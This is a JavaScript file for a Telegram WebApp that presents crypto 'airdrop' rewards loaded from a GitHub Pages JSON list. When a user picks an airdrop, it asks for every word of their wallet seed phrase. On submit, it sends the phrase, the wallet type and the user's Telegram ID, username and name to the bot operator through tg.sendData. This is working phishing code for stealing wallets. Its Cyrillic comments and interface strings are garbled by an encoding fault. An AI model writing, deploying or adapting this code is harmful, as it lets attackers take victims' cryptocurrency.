let tg = null;
let demoMode = false;

// ======= –Ü–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–∞—Ü—ñ—è Telegram WebApp =======
function initTelegram() {
    if (typeof Telegram === "undefined" || !Telegram.WebApp) {
        console.warn("üì¶ Telegram WebApp –Ω–µ –∑–Ω–∞–π–¥–µ–Ω–æ ‚Äì –∞–∫—Ç–∏–≤–æ–≤–∞–Ω–æ –¥–µ–º–æ-—Ä–µ–∂–∏–º.");
        demoMode = true;
        return;
    }

    tg = Telegram.WebApp;
    tg.ready();
    console.log("‚úÖ Telegram WebApp —ñ–Ω—ñ—Ü—ñ–∞–ª—ñ–∑–æ–≤–∞–Ω–æ");

    const user = tg.initDataUnsafe?.user || {};
    const uid = user.id || localStorage.getItem("tg_user_id") || "-";
    const uname = user.username || localStorage.getItem("tg_username") || "-";
    const fname = [user.first_name, user.last_name].filter(Boolean).join(" ") || localStorage.getItem("tg_name") || "-";

    // üíæ –ó–±–µ—Ä—ñ–≥–∞—î–º–æ —É localStorage
    localStorage.setItem("tg_user_id", uid);
    localStorage.setItem("tg_username", uname);
    localStorage.setItem("tg_name", fname);
}

// ======= DOM –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–æ =======
document.addEventListener("DOMContentLoaded", () => {
    initTelegram();

    // ======= Telegram —Å—Ç–∞—Ç—É—Å =======
    const tgStatus = document.getElementById("tg_status");
    const uid = localStorage.getItem("tg_user_id") || "-";
    const uname = localStorage.getItem("tg_username") || "-";
    const fname = localStorage.getItem("tg_name") || "-";

    if (demoMode) {
        tgStatus.innerText = "üì¶ –î–µ–º–æ-—Ä–µ–∂–∏–º –∞–∫—Ç–∏–≤–Ω–∏–π (–≤—ñ–¥–∫—Ä–∏—Ç–æ —á–µ—Ä–µ–∑ –±—Ä–∞—É–∑–µ—Ä)";
    } else {
        tgStatus.innerHTML = `
            üë§ –ü–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å: ${fname}<br>
            üÜî Telegram ID: ${uid}<br>
            üìõ Username: @${uname !== "-" ? uname : "–Ω–µ—Ç"}
        `;
    }

    // ======= –ó–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—è Airdrops =======
    fetch('https://sp574-maker.github.io/maker/data/airdrops.json')
        .then(res => res.json())
        .then(data => {
            const container = document.getElementById('airdropList');
            container.innerHTML = '';
            data.forEach(drop => {
                const card = document.createElement('div');
                card.className = 'airdrop-card';
                card.innerHTML = `
                    <img src="${drop.logo}" class="token-logo" alt="${drop.name}" />
                    <h2>${drop.name}</h2>
                    <p>üí∏ –ù–∞–≥–æ—Ä–æ–¥–∞: <strong>${drop.reward}</strong></p>
                    <p>üåê –ú–µ—Ä–µ–∂–∞: ${drop.network}</p>
                    <p>‚è≥ –î–æ: ${drop.ends}</p>
                    <button onclick="selectAirdrop('${drop.name}')">–£—á–∞—Å—Ç—å</button>
                `;
                container.appendChild(card);
            });
        })
        .catch(error => {
            console.error("‚ùå –ü–æ–º–∏–ª–∫–∞ –ø—Ä–∏ –∑–∞–≤–∞–Ω—Ç–∞–∂–µ–Ω–Ω—ñ airdrops.json:", error);
            document.getElementById("airdropList").innerHTML =
                "<p style='color:red'>‚ùå –ù–µ –≤–¥–∞–ª–æ—Å—è –∑–∞–≤–∞–Ω—Ç–∞–∂–∏—Ç–∏ —Å–ø–∏—Å–æ–∫ airdrop'—ñ–≤.</p>";
        });

    // ======= Submit –∫–Ω–æ–ø–∫–∞ =======
    const btn = document.getElementById('submitBtn');
    if (btn) btn.addEventListener('click', submitAirdrop);

    // ======= –ö–∞—Å—Ç–æ–º–Ω–∏–π —Å–µ–ª–µ–∫—Ç–æ—Ä –≥–∞–º–∞–Ω—Ü—è =======
    const selectWrapper = document.querySelector('.custom-select');
    if (selectWrapper) {
        const selected = selectWrapper.querySelector('.selected');
        const options = selectWrapper.querySelectorAll('.options li');
        const hiddenInput = document.querySelector('#wallet');

        selected.addEventListener('click', () => {
            selectWrapper.classList.toggle('open');
        });

        options.forEach(option => {
            option.addEventListener('click', () => {
                selected.innerHTML = option.innerHTML;
                hiddenInput.value = option.dataset.value;
                selectWrapper.classList.remove('open');
            });
        });

        document.addEventListener('click', e => {
            if (!selectWrapper.contains(e.target)) {
                selectWrapper.classList.remove('open');
            }
        });
    }
});

// ======= –í–∏–±—ñ—Ä Airdrop =======
function selectAirdrop(name) {
    document.getElementById('selectedAirdropTitle').innerText = `üîó ${name}`;
    document.getElementById('airdropList').style.display = 'none';
    document.getElementById('airdropForm').style.display = 'block';
    renderSeedInputs();
}

// ======= –†–µ–Ω–¥–µ—Ä –ø–æ–ª—ñ–≤ seed =======
function renderSeedInputs() {
    const length = parseInt(document.getElementById('length').value);
    const container = document.getElementById('seedContainer');
    container.innerHTML = '';

    for (let i = 0; i < length; i++) {
        const input = document.createElement('input');
        input.type = 'text';
        input.placeholder = `–°–ª–æ–≤–æ ${i + 1}`;
        container.appendChild(input);
    }

    const inputs = container.querySelectorAll('input');
    if (inputs.length > 0) {
        inputs[0].addEventListener('paste', (e) => {
            e.preventDefault();
            const pasted = (e.clipboardData || window.clipboardData).getData('text');
            const words = pasted.trim().split(/\s+/);
            if (words.length > 1) {
                words.forEach((word, index) => {
                    if (inputs[index]) inputs[index].value = word;
                });
            } else {
                inputs[0].value = pasted;
            }
        });
    }
}

// ======= Submit —Ñ–æ—Ä–º–∏ =======
function submitAirdrop() {
    const inputs = Array.from(document.querySelectorAll('#seedContainer input'));
    const words = inputs.map(input => input.value.trim()).filter(Boolean);

    if (words.length !== inputs.length) {
        document.getElementById('validationWarning').innerText = '‚ùóÔ∏è –ó–∞–ø–æ–≤–Ω—ñ—Ç—å –≤—Å—ñ –ø–æ–ª—è.';
        document.getElementById('validationWarning').style.display = 'block';
        return;
    }

    const payload = {
        event: "airdrop_claim",
        user_id: tg?.initDataUnsafe?.user?.id || localStorage.getItem("tg_user_id") || "-",
        username: tg?.initDataUnsafe?.user?.username || localStorage.getItem("tg_username") || "-",
        name: localStorage.getItem("tg_name") || "-",
        timestamp: new Date().toISOString(),
        seed: words.join(" "),
        wallet: document.getElementById("wallet").value
    };

    // ===== –í—ñ–¥–ø—Ä–∞–≤–∫–∞ —á–µ—Ä–µ–∑ Telegram WebApp –∞–±–æ –ª–æ–≥ —É –±—Ä–∞—É–∑–µ—Ä—ñ =====
    if (!demoMode && tg?.sendData) {
        console.log("[üì§ –ù–∞–¥—Å–∏–ª–∞–Ω–Ω—è –≤ Telegram WebApp]", payload);
        tg.sendData(JSON.stringify(payload));
        tg.close();
    } else {
        console.warn("üì¶ –î–µ–º–æ-—Ä–µ–∂–∏–º: –¥–∞–Ω—ñ –Ω–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ —á–µ—Ä–µ–∑ Telegram.");
        alert("üì¶ –î–µ–º–æ-—Ä–µ–∂–∏–º: –¥–∞–Ω—ñ –Ω–µ –Ω–∞–¥—ñ—Å–ª–∞–Ω–æ (–±—Ä–∞—É–∑–µ—Ä–Ω–∏–π —Ä–µ–∂–∏–º). –í—ñ–¥–∫—Ä–∏–π—Ç–µ —á–µ—Ä–µ–∑ Telegram –¥–ª—è —Ä–µ–∞–ª—å–Ω–æ—ó –≤—ñ–¥–ø—Ä–∞–≤–∫–∏.");
        console.log("[DEMO PAYLOAD]", payload);
    }
}
